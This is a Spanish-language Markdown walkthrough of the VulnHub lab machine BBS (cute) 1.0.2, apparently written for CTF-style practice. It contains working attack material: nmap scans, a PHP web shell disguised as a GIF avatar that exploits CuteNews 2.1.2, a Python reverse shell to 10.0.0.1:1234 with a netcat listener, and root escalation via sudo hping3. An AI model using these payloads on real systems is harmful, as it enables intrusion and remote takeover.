<h1 align="center">
<br>
  <img src="https://media1.tenor.com/images/30b8dc5259183e941fff4ca89ee171b2/tenor.gif?itemid=15749033" alt="Front-End Checklist" width="200">
  <br>
  BBS (CUTE): 1.0.2
  <br>
</h1>

<h4 align="center">Maquina creada por foxlox</h4>
<h4 align="center">Aquí puedes descargarte la <a href="http://www.vulnhub.com/entry/bbs-cute-102,567/">página web</a> y ver una descripción de ella</h4>

---
# Índice

- [Recopilación de información](#recopilación-de-información)
  - [Nmap](#nmap)
  - [Web](#)
- [Búsqueda de vulnerabilidades](#búsqueda-de-vulnerabilidades)
  - [Web](#)
- [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades)
  - [Remote Code Execution](#)
  - [Reverse Shell](#)
- [Post-explotación](#)
  - [Búsqueda de vulnerabilidades](#búsqueda-de-vulnerabilidades-1)
       - [SUDO -L](#)
  - [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades-1)
       - [HPING3](#)
- [Información Adicional](#información-adicional)


---

## Recopilación de información

Aquí veremos que esta conectado a la subred, los puerto abiertos, las paginas web, etc.

### Nmap

Veremos que redes estan conectadas a esta subred con este comando:

```nmap -sP 192.168.56.0/24```

Para ver los puertos abiertos que tiene la red utilizaremos este comando:

```nmap -sV -sC 192.168.56.101```

Para ver si esos puertos son vulnerables usaremos este comando:

```nmap -Pn -T4 -p 80,88,110,995 --script vuln 192.168.56.101```

### Web

Iremos a la pagina **index.php** y usaremos **Ctrl+U** para ver el código fuente, veremos que el captcha tiene una .php y ademas veremos la versión del **Cutenews**

<img src="https://i.gyazo.com/ec8dc1b59c4ed97bf2bea3cf8ba8a6b8.png">

## Búsqueda de vulnerabilidades

### Web
Después de esto nos registraremos y buscaremos un exploit para esa versión del **Cutenews**

Encontramos este [exploit](https://www.exploit-db.com/exploits/48800) y nos aprovechamos del payload para meterlo como php en el avatar:

```
GIF8;
<?php system($_REQUEST['cmd']) ?>
```

> El **GIF8;** es para que tenga un tamaño y sea aceptado como avatar

## Explotación de vulnerabilidades

### Remote Code Execution

Para obtener la ejecución de código remoto iremos a esta página web para utilizar el exploit anteriormente visto:

```http://192.168.56.101/uploads/avatar_jose_script.php?cmd=whoami```

Gracias a esto somos **www-data**

### Reverse Shell

Ahora buscaremos una [reverse shell en python](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/)para tener permisos como usuario.
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

> Esto lo añadimos a la url anterior tal que asi: **?cmd=AQUI_LA_REVERSE_SHELL**

Por último abriremos un puerto para recibir la respuesta de la reverse shell:

```rlwrap nc -nvlp 1234```

## Post-explotación

Para tener una shell interactiva usaremos este comando:

```python3 -c 'import pty; pty.spawn("/bin/bash")'```

## Búsqueda de vulnerabilidades

### SUDO -L

Para ver que puede ejecutar este usuario como root usaremos el comando ```sudo -l```

El resultado es este:
```
(root) NOPASSWD: /usr/sbin/hping3 --icmp
```

## Explotación de vulnerabilidades

### HPING3

Aquí tienes una [web](https://tools.kali.org/information-gathering/hping3) donde explica las utilidades del hpin3.

Para tener root usaremos el comando tal cual y entraremos:
```sudo /usr/sbin/hping3 --icmp```

## Información Adicional

Páginas web utilizadas:

- [Exploit](https://www.exploit-db.com/exploits/48800) - Exploit Remote Code Execution del CuteNews 2.1.2.

- [Reverse Shell](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/) - Cheat Sheet de reverse shells.

- [HPIN3](https://tools.kali.org/information-gathering/hping3) - Descripción del paquete hping3.


**[⬆ back to top](#-----hogwarts-bellatrix-)**
